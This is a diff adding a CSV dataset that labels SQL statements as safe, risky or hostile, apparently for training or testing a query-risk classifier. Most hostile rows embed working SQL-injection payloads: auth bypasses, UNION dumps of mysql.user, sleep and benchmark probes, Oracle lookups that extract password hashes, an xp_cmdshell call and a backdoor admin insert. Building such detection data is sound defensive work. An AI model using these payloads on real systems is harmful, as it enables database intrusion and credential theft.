@@ -1,0 +1,1501 @@
+id,family,class,sql
+1,sl_generic,hostile,SELECT * FROM members WHERE id = 1 or 1 --'
+2,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM payments a JOIN sessions b ON b.user_id = a.id WHERE a.shop_id = 11 GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+3,sl_auth_bypass,hostile,"SELECT id, code FROM orders WHERE code = '%2b'--+' union all select 1,'haha',3,4,5 from mysql.user%23"
+4,sl_boolean_blind,hostile,"SELECT id, name FROM members WHERE name = '(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 UNION ALL SELECT 4471) END))"
+5,sl_generic,hostile,"SELECT id, name FROM users WHERE name = '"" or """"-"""
+6,sl_auth_bypass,hostile,"SELECT * FROM accounts WHERE id = 1 AND MID(VERSION(),1,1) = '5'"
+7,sl_auth_bypass,hostile,"SELECT id, username FROM products WHERE username = 'id=%20--%20%27%20union%20select%201,2%20from%20users%23"
+8,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM refunds a JOIN payments b ON b.user_id = a.id WHERE a.title = 'Summer Sale' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+9,sl_auth_bypass,hostile,"SELECT id, code FROM products WHERE code = 'left(data,1)"
+10,read_simple,safe,"SELECT created_at, id FROM payments WHERE updated_at >= '2026-03-15' LIMIT 20"
+11,sl_generic,hostile,"SELECT id, name FROM accounts WHERE name = 'hi' or 'a'='a"
+12,write_bounded,safe,UPDATE products SET amount = 100.00 WHERE id = 2048
+13,unbounded_write,risky,UPDATE carts SET title = 'Summer Sale'
+14,sl_auth_bypass,hostile,SELECT * FROM products WHERE id = 1' union all select 1
+15,read_simple,safe,"SELECT user_id, title FROM coupons WHERE name = 'Carol Wu' LIMIT 50"
+16,write_bounded,safe,"INSERT INTO reviews (shop_id, name) VALUES (27, 'Daniel Ma')"
+17,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = 'root"" or ""1""=""1"
+18,sl_auth_bypass,hostile,SELECT * FROM users WHERE id = 1 select{x%0acomment}from{x%0aguestbook}limit 1
+19,sl_auth_bypass,hostile,"SELECT id, username FROM sessions WHERE username = '?id=1 ^ (select(ascii((substring((select db_name(1)) ,1,1)))))-108"
+20,sl_error_based,hostile,"SELECT id, code FROM products WHERE code = ',(CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))::text||'qpbxq' AS NUMERIC))"
+21,unbounded_write,risky,UPDATE refunds SET title = 'Summer Sale'
+22,sl_union,hostile,SELECT * FROM orders WHERE id = 1 union select
+23,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = '/*--+/*x/*/union all select 1,@@version,@@datadir,4,5 from mysql.user%23"
+24,stacked,hostile,"SELECT 1; INSERT INTO users (name, role) VALUES ('backdoor', 'admin')--"
+25,schema_change,risky,ALTER TABLE shops MODIFY COLUMN id VARCHAR(32) NOT NULL
+26,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = '' or ''*'"
+27,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = '' or username like '%"
+28,admin_op,risky,REVOKE SELECT ON users FROM 'etl'@'%'
+29,sl_mssql,hostile,"SELECT id, username FROM accounts WHERE username = '' union (select NULL, NULL, (select @@version)) --"
+30,sl_oracle,hostile,"SELECT id, title FROM sessions WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i"
+31,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = 'root') or ('1'='1'#"
+32,sl_auth_bypass,hostile,"SELECT * FROM orders WHERE id = 1 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0"
+33,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+34,sl_generic,hostile,"SELECT id, username FROM users WHERE username = 'admin"") or (""1""=""1""/*"
+35,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM shops a JOIN products b ON b.shop_id = a.id WHERE a.title = 'VIP Upgrade' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+36,unbounded_write,risky,UPDATE products SET status = 'refunded'
+37,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = ''-'"
+38,read_simple,safe,"SELECT updated_at, email FROM carts WHERE email = 'alice@example.com' LIMIT 10"
+39,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM users a JOIN users b ON b.user_id = a.id WHERE a.updated_at >= '2025-12-31' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+40,admin_op,risky,SET GLOBAL wait_timeout = 500
+41,admin_op,risky,GRANT SELECT ON refunds.* TO 'etl'@'%'
+42,sl_generic,hostile,"SELECT id, title FROM accounts WHERE title = '; execute immediate 'sel' || 'ect us' || 'er'"
+43,schema_change,risky,ALTER TABLE refunds DROP COLUMN name
+44,sl_time_blind,hostile,"SELECT * FROM accounts WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))"
+45,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = 'root'/*"
+46,sl_error_based,hostile,"SELECT * FROM products WHERE id = 1 OR 3271=TO_POSIXTIME(TO_DATE('qjvkq'||(SELECT CASE WHEN (3271=3271) THEN 1 ELSE 0 END)||'qpbxq','YYYY'))"
+47,sl_auth_bypass,hostile,"SELECT id, name FROM members WHERE name = '' and substr(data,1,1) = 0x61# 0x6162"
+48,waf_comment,hostile,SELECT * FROM users WHERE id = 1 UNION/*!50001SELECT*/ * FROM admin
+49,write_bounded,safe,"INSERT INTO carts (name, email) VALUES ('Alice Chen', 'bob@shop.io')"
+50,write_bounded,safe,DELETE FROM users WHERE id = 317 AND amount = 250.50
+51,sl_auth_bypass,hostile,"SELECT id, title FROM users WHERE title = 'updatexml(0,lpad(.1,350,hex(hex(user()))),1)"
+52,sl_time_blind,hostile,"SELECT * FROM members WHERE id = 1 AND ''qxjkp''=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),500000000),NULL)"
+53,waf_comment,hostile,SELECT * FROM t WHERE id=.1 UNION/*.1*/SELECT-.1
+54,read_simple,safe,"SELECT status, title FROM carts WHERE user_id = 3 LIMIT 10"
+55,unbounded_write,risky,UPDATE orders SET status = 'paid'
+56,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 BEGIN IF (3271=3271) THEN DBMS_SESSION.SLEEP(5); ELSE DBMS_SESSION.SLEEP(0); END IF; END;
+57,write_bounded,safe,"INSERT INTO users (amount, email) VALUES (100.00, 'carol@mail.com')"
+58,sl_auth_bypass,hostile,"SELECT id, username FROM members WHERE username = 'root"") or ""1""=""1""/*"
+59,sl_inline_query,hostile,"SELECT id, code FROM products WHERE code = '(SELECT 'qjvkq'||(CASE WHEN (3271=3271) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'qpbxq' FROM DUAL)"
+60,write_bounded,safe,DELETE FROM payments WHERE id = 100 AND amount = 100.00
+61,sl_auth_bypass,hostile,SELECT * FROM orders WHERE id = 1' \Nunion select 1
+62,schema_change,risky,ALTER TABLE products DROP COLUMN status
+63,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq')) USING utf8)))"
+64,write_bounded,safe,DELETE FROM users WHERE id = 100 AND created_at >= '2026-09-01'
+65,patt_sqlite,hostile,SELECT * FROM t WHERE id = 1 UNION SELECT sql FROM sqlite_master
+66,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 or pg_sleep(5)--
+67,sl_error_based,hostile,"SELECT * FROM products WHERE id = 1 AND 3271=CTXSYS.DRITHSX.SN(3271,('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'))"
+68,sl_time_blind,hostile,"SELECT * FROM members WHERE (title = 'x')) or benchmark(10000000,MD5(1))#"
+69,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 AND 3271=(SELECT SLEEP(5) FROM db_root)
+70,sl_generic,hostile,"SELECT id, username FROM sessions WHERE username = 'x' AND email IS NULL; --"
+71,sl_auth_bypass,hostile,"SELECT * FROM sessions WHERE id = 1 union all /*!/*!select*/1 as %27*/%27,2,3,4,5 from mysql.user%23"
+72,sl_auth_bypass,hostile,"SELECT id, email FROM accounts WHERE email = '(select(select{x pwd}from{x %23@__admin}+limit+1)"
+73,sl_generic,hostile,SELECT * FROM accounts WHERE id = 0 or 1=1
+74,sl_stacked,hostile,"SELECT * FROM accounts WHERE id = 1 ;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3"
+75,read_simple,safe,"SELECT name, amount FROM sessions WHERE status = 'active' LIMIT 20"
+76,sl_generic,hostile,"SELECT id, name FROM sessions WHERE name = 'admin' or 1=1#"
+77,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM carts a JOIN refunds b ON b.shop_id = a.id WHERE a.id = 1 GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+78,sl_oracle,hostile,"SELECT id, username FROM orders WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i"
+79,schema_change,risky,ALTER TABLE refunds DROP COLUMN title
+80,sl_time_blind,hostile,"SELECT id, name FROM sessions WHERE name = '';waitfor delay '0:0:5'--"
+81,sl_auth_bypass,hostile,"SELECT id, code FROM orders WHERE code = '' or 1 rlike '1"
+82,unbounded_write,risky,UPDATE refunds SET amount = 250.50
+83,sl_oracle,hostile,"SELECT id, username FROM users WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i"
+84,read_simple,safe,"SELECT user_id, updated_at FROM payments WHERE name = 'Carol Wu' LIMIT 50"
+85,waf_encoding,hostile,SELECT CHAR(75)+CHAR(76)+CHAR(77)
+86,sl_auth_bypass,hostile,"SELECT * FROM products WHERE id = 99999=(select 1 as '--+') union all select 1,2,3,4,5 from mysql.user%23"
+87,write_bounded,safe,UPDATE sessions SET updated_at = '2025-12-31' WHERE id = 2048
+88,sl_generic,hostile,"SELECT id, name FROM members WHERE name = '(select top 1"
+89,admin_op,risky,GRANT ALL PRIVILEGES ON users.* TO 'migration'@'%'
+90,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM coupons a JOIN users b ON b.user_id = a.id WHERE a.shop_id = 27 GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
+91,sl_auth_bypass,hostile,"SELECT id, title FROM sessions WHERE title = 'validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select{x pwd}from{x %23@__admin}+limit+1)))%23"
+92,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 AND 3271=BIN_SHL(CAST('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qpbxq' AS BIGINT),1)"
+93,sl_generic,hostile,"SELECT id, username FROM products WHERE username = 'admin') or ('1'='1'--"
+94,sl_generic,hostile,"SELECT id, name FROM orders WHERE name = 'admin""/*"
+95,sl_auth_bypass,hostile,SELECT * FROM users WHERE id = 1'/*!5000union*//*!5000select*/1
+96,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM products a JOIN orders b ON b.shop_id = a.id WHERE a.name = 'Alice Chen' GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+97,write_bounded,safe,UPDATE users SET amount = 100.00 WHERE id = 1
+98,admin_op,risky,REVOKE DELETE ON sessions FROM 'readonly'@'%'
+99,sl_time_blind,hostile,"SELECT * FROM members WHERE id = 1) or benchmark(10000000,MD5(1))#"
+100,sl_boolean_blind,hostile,SELECT * FROM products WHERE id = 1 ;SELECT (CASE WHEN (3271=3271) THEN 3271 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL
+101,write_bounded,safe,UPDATE coupons SET title = 'Free Shipping' WHERE id = 42
+102,sl_time_blind,hostile,SELECT * FROM users WHERE id = 1 DECLARE @x CHAR(9) SET @x=0x303a303a35 WAITFOR DELAY @x
+103,schema_change,risky,ALTER TABLE products DROP COLUMN amount
+104,write_bounded,safe,UPDATE orders SET updated_at = '2025-12-31' WHERE id = 2048
+105,sl_generic,hostile,"SELECT id, name FROM products WHERE name = '; exec master..xp_cmdshell 'ping 172.10.1.255'--"
+106,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,2,1%29%29=111 http://localhost/sql.php?id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,3,1%29%29=111 http://localhost/sql.php?id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,4,1%29%29=116"
+107,sl_time_blind,hostile,SELECT * FROM orders WHERE id = 1 ;BEGIN DBMS_LOCK.SLEEP(5); END
+108,sl_generic,hostile,"SELECT id, code FROM users WHERE code = '(sqlvuln)"
+109,sl_auth_bypass,hostile,"SELECT id, code FROM accounts WHERE code = '?did=2%0Aand/**/(select%0Auser())=”"
+110,sl_time_blind,hostile,"SELECT id, code FROM accounts WHERE code = '(SELECT 3271 FROM (SELECT(SLEEP(5)))'qxjkp')"
+111,sl_error_based,hostile,"SELECT id, email FROM orders WHERE email = '(SELECT 3271=('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qpbxq'))"
+112,sl_generic,hostile,SELECT * FROM members WHERE id = 1 or%201=1 --
+113,sl_auth_bypass,hostile,"SELECT id, code FROM orders WHERE code = 'root"") or (""1""=""1""/*"
+114,schema_change,risky,ALTER TABLE shops DROP COLUMN updated_at
+115,sl_generic,hostile,"SELECT id, code FROM sessions WHERE code = '; or '1'='1'"
+116,sl_time_blind,hostile,"SELECT id, title FROM orders WHERE title = '(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"
+117,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = ''OR '' = '	Allows authentication without a valid username."
+118,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = 'true !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L"
+119,write_bounded,safe,"INSERT INTO carts (updated_at, status) VALUES ('2026-08-20', 'cancelled')"
+120,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 ;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep(5)"
+121,schema_change,risky,ALTER TABLE carts DROP COLUMN created_at
+122,sl_time_blind,hostile,"SELECT id, username FROM accounts WHERE username = '%20$(sleep%2050)"
+123,sl_time_blind,hostile,"SELECT * FROM sessions WHERE (code = 'x'')) or benchmark(10000000,MD5(1))#"
+124,sl_auth_bypass,hostile,"SELECT id, name FROM accounts WHERE name = 'length(trim(leading 'a' FROM data)) # length will be shorter"
+125,waf_encoding,hostile,SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+126,sl_generic,hostile,"SELECT id, title FROM users WHERE title = 'admin') or ('1'='1"
+127,sl_time_blind,hostile,"SELECT id, username FROM users WHERE username = '' or sleep(5)#"
+128,sl_mssql,hostile,"SELECT id, name FROM orders WHERE name = '' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)"
+129,sl_auth_bypass,hostile,"SELECT id, title FROM products WHERE title = 'id=49 %u0061nd 1=2 un%u0069on se%u006c%u0065ct 1,2,3,4,5 from admin"
+130,write_bounded,safe,"INSERT INTO shops (id, created_at) VALUES (42, '2026-09-01')"
+131,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = 'root"" or 1=1#"
+132,graphql_sqli,hostile,"SELECT * FROM users WHERE id IN (1,2) UNION SELECT api_key,secret FROM shops"
+133,sl_generic,hostile,"SELECT id, code FROM users WHERE code = '("
+134,blind_boolean,hostile,"SELECT IF(1=1, 'true', 'false')"
+135,sl_generic,hostile,"SELECT id, code FROM members WHERE code = '' or '1'='1'--"
+136,sl_auth_bypass,hostile,"SELECT id, title FROM orders WHERE title = 'root"") or ""1""=""1""#"
+137,read_simple,safe,"SELECT title, status FROM carts WHERE status = 'refunded' LIMIT 100"
+138,sl_boolean_blind,hostile,"SELECT * FROM products WHERE id = 1 OR (SELECT (CASE WHEN (3271=3271) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3271) END) FROM DUAL) IS NULL"
+139,read_simple,safe,"SELECT title, email FROM payments WHERE id = 317 LIMIT 20"
+140,sl_mysql,hostile,SELECT * FROM users WHERE id = 1 exec sp_ (or exec xp_)
+141,read_simple,safe,"SELECT created_at, user_id FROM sessions WHERE status = 'paid' LIMIT 10"
+142,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = '<username>' OR 1=1--"
+143,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = 'id=union /*!50001select*/ * from ddd"
+144,sl_error_based,hostile,SELECT * FROM accounts WHERE id = 1 OR 3271=('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qpbxq')
+145,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 RLIKE !SLEEP(5)
+146,sl_stacked,hostile,"SELECT * FROM members WHERE id = 1 ;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),500000000),NULL)"
+147,schema_change,risky,DROP TABLE refunds
+148,schema_change,risky,ALTER TABLE sessions MODIFY COLUMN amount VARCHAR(32) NOT NULL
+149,sl_error_based,hostile,SELECT * FROM accounts WHERE id = 1 AND 3271=CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))::text||'qpbxq' AS NUMERIC)
+150,sl_generic,hostile,SELECT * FROM products WHERE id = 1 or isNULL(1/0) /*
+151,sl_mssql,hostile,"SELECT id, email FROM sessions WHERE email = ''create user name identified by pass123 temporary tablespace temp default tablespace users;"
+152,sl_auth_bypass,hostile,"SELECT id, code FROM sessions WHERE code = 'extractvalue(rand(0),concat(0x0a,version()))"
+153,unbounded_write,risky,UPDATE products SET status = 'active'
+154,sl_boolean_blind,hostile,"SELECT id, code FROM orders WHERE code = '(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 1/(SELECT 0) END))"
+155,sl_generic,hostile,"SELECT id, email FROM accounts WHERE email = 'admin'/*"
+156,schema_change,risky,ALTER TABLE products MODIFY COLUMN amount VARCHAR(32) NOT NULL
+157,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = 'root' or 1=1/*"
+158,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 PROCEDURE ANALYSE(EXTRACTVALUE(3271,CONCAT('\','qjvkq',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END)),'qpbxq')),1)"
+159,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 OR 3271=BENCHMARK(5000000,MD5(''qxjkp''))"
+160,sl_auth_bypass,hostile,"SELECT * FROM users WHERE id = 1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'"
+161,read_simple,safe,"SELECT updated_at, name FROM sessions WHERE id = 2048 LIMIT 10"
+162,sl_time_blind,hostile,"SELECT * FROM members WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"
+163,sl_generic,hostile,SELECT * FROM accounts WHERE id = 23 OR 1=1
+164,sl_auth_bypass,hostile,"SELECT id, email FROM orders WHERE email = '?id=123/*/#\*/union/*/#\*/select/*/#\*/1,2,3/*/#\*/from/*/#\*/admin"
+165,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 OR 3271=(SELECT COUNT(fuzzBits(''qxjkp'', 0.001)) FROM numbers(1000000))"
+166,write_bounded,safe,"INSERT INTO payments (email, status) VALUES ('alice@example.com', 'paid')"
+167,blind_time,hostile,"SELECT * FROM t WHERE id = 1 AND IF(EXISTS(SELECT * FROM users WHERE username = 'root'), BENCHMARK(1000000000, MD5(1)), 0)"
+168,admin_op,risky,REVOKE ALTER ON users FROM 'migration'@'%'
+169,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM carts a JOIN carts b ON b.shop_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+170,write_bounded,safe,UPDATE carts SET status = 'refunded' WHERE id = 1
+171,auth_bypass,hostile,SELECT * FROM users WHERE user = 'admin'--' AND pass = 'x'
+172,sl_boolean_blind,hostile,"SELECT id, title FROM members WHERE title = 'IIF(3271=3271,1,1/0)"
+173,write_bounded,safe,"INSERT INTO refunds (user_id, title) VALUES (3, 'Free Shipping')"
+174,blind_boolean,hostile,"SELECT * FROM t WHERE id = 1 AND MID(VERSION(), 1, 1) = '5'"
+175,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 ;SELECT SLEEP(5)
+176,read_join_agg,safe,"SELECT a.email, COUNT(b.id) AS cnt FROM reviews a JOIN sessions b ON b.shop_id = a.id WHERE a.email = 'alice@example.com' GROUP BY a.email ORDER BY cnt DESC LIMIT 50"
+177,sl_auth_bypass,hostile,"SELECT id, title FROM sessions WHERE title = '' and substr(data,1,1) = lower(conv(10,10,36))# 'a'"
+178,write_bounded,safe,"INSERT INTO coupons (updated_at, email) VALUES ('2026-03-15', 'bob@shop.io')"
+179,waf_encoding,hostile,SELECT * FROM t WHERE id = 1 OR 0x50 = 0x50
+180,legit_lookalike,safe,"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'orders'"
+181,admin_op,risky,GRANT DROP ON reviews.* TO 'analytics'@'%'
+182,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 AND (SELECT 3271 FROM (SELECT(SLEEP(5)))'qxjkp')
+183,sl_time_blind,hostile,SELECT * FROM accounts WHERE (code = 'x')) or pg_sleep(5)--
+184,sl_time_blind,hostile,"SELECT id, name FROM orders WHERE name = '' or sleep(5)='"
+185,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = 'xxx'%2b'--+'union all select 1,2,3"
+186,read_simple,safe,"SELECT name, email FROM payments WHERE name = 'Daniel Ma' LIMIT 50"
+187,sl_auth_bypass,hostile,"SELECT * FROM orders WHERE id = 99999=(select '--+') union all select 1,2,3,4,5 from mysql.user%23"
+188,read_simple,safe,"SELECT amount, id FROM reviews WHERE name = 'Daniel Ma' LIMIT 10"
+189,sl_auth_bypass,hostile,"SELECT id, username FROM products WHERE username = 'root""/*"
+190,sl_auth_bypass,hostile,"SELECT id, code FROM accounts WHERE code = 'root"" or ""1""=""1""#"
+191,unbounded_write,risky,UPDATE sessions SET title = 'Welcome Coupon'
+192,schema_change,risky,TRUNCATE TABLE orders
+193,sl_oracle,hostile,"SELECT id, title FROM products WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i"
+194,sl_generic,hostile,"SELECT id, email FROM sessions WHERE email = 'admin"" or ""1""=""1""--"
+195,schema_change,risky,ALTER TABLE coupons DROP COLUMN status
+196,sl_auth_bypass,hostile,"SELECT id, username FROM orders WHERE username = '' or 1=1/*"
+197,write_bounded,safe,UPDATE carts SET status = 'refunded' WHERE id = 317
+198,write_bounded,safe,UPDATE reviews SET status = 'refunded' WHERE id = 1
+199,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM coupons a JOIN payments b ON b.user_id = a.id WHERE a.id = 42 GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+200,read_simple,safe,"SELECT user_id, id FROM orders WHERE email = 'carol@mail.com' LIMIT 50"
+201,sl_boolean_blind,hostile,"SELECT id, code FROM accounts WHERE code = ',(SELECT * FROM GENERATE_SERIES(3271,3271,CASE WHEN (3271=3271) THEN 1 ELSE 0 END) LIMIT 1)"
+202,schema_change,risky,ALTER TABLE sessions MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+203,unbounded_write,risky,UPDATE payments SET status = 'cancelled'
+204,sl_mssql,hostile,"SELECT id, title FROM products WHERE title = '' union (select @@version) --"
+205,sl_generic,hostile,SELECT * FROM users WHERE id = 1 select
+206,sl_time_blind,hostile,"SELECT id, username FROM orders WHERE username = 'ELT(3271=3271,!SLEEP(5))"
+207,sl_oracle,hostile,"SELECT id, email FROM users WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i"
+208,sl_time_blind,hostile,SELECT * FROM orders WHERE id = 1 RLIKE SLEEP(5)
+209,sl_auth_bypass,hostile,"SELECT id, code FROM accounts WHERE code = 'ceil(pi()+pi()) 7 ceil(pi()*version()) 17 ceil(version()*version()) 27"
+210,patt_mysql,hostile,"SELECT * FROM t WHERE id = 1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)"
+211,sl_auth_bypass,hostile,SELECT * FROM orders WHERE id = 1' union%0d%0aselect%0d%0a1
+212,unbounded_write,risky,UPDATE coupons SET title = 'Summer Sale'
+213,sl_time_blind,hostile,SELECT * FROM users WHERE (username = 'x') or sleep(5)='
+214,write_bounded,safe,DELETE FROM orders WHERE id = 42 AND shop_id = 902
+215,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = 'x' AND userid IS NULL; --"
+216,sl_auth_bypass,hostile,"SELECT id, username FROM sessions WHERE username = 'root"" or ""1""=""1""--"
+217,sl_error_based,hostile,"SELECT id, code FROM members WHERE code = '(CAST('qjvkq'||(SELECT 1 FROM GENERATE_SERIES(3271,3271,CASE WHEN (3271=3271) THEN 1 ELSE 0 END) LIMIT 1)::text||'qpbxq' AS NUMERIC))"
+218,sl_auth_bypass,hostile,SELECT * FROM members WHERE id = 1e1union select 1 //select user from mysql.user where user = 'root' and 1=1e1union select 1
+219,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = ''-if(locate('f',data),1,0)#"
+220,unbounded_write,risky,UPDATE reviews SET status = 'paid'
+221,unbounded_write,risky,UPDATE orders SET title = 'Welcome Coupon'
+222,schema_change,risky,ALTER TABLE carts DROP COLUMN status
+223,schema_change,risky,ALTER TABLE refunds MODIFY COLUMN status VARCHAR(32) NOT NULL
+224,sl_auth_bypass,hostile,"SELECT id, name FROM members WHERE name = 'validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update (select(select{x pwd}from{x %23@__admin}+limit+1)))%23"
+225,sl_auth_bypass,hostile,SELECT * FROM users WHERE id = 1 ||1=0
+226,schema_change,risky,ALTER TABLE users MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+227,sl_auth_bypass,hostile,"SELECT id, username FROM products WHERE username = '(select ""/*"") union all select xxx from xxx-- */"
+228,sl_error_based,hostile,"SELECT * FROM sessions WHERE id = 1 OR ERROR(CONCAT('qjvkq',(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END)),'qpbxq')) IS NOT NULL"
+229,sl_oracle,hostile,"SELECT id, email FROM orders WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i"
+230,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 or a = a
+231,sl_stacked,hostile,"SELECT * FROM orders WHERE id = 1 ;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3"
+232,sl_time_blind,hostile,SELECT * FROM users WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
+233,schema_change,risky,ALTER TABLE products MODIFY COLUMN status VARCHAR(32) NOT NULL
+234,admin_op,risky,REVOKE UPDATE ON shops FROM 'ops'@'%'
+235,sl_time_blind,hostile,SELECT * FROM orders WHERE id = 1 AND SLEEP(5)
+236,sl_oracle,hostile,"SELECT id, name FROM products WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i"
+237,read_simple,safe,"SELECT amount, shop_id FROM reviews WHERE created_at >= '2026-06-30' LIMIT 100"
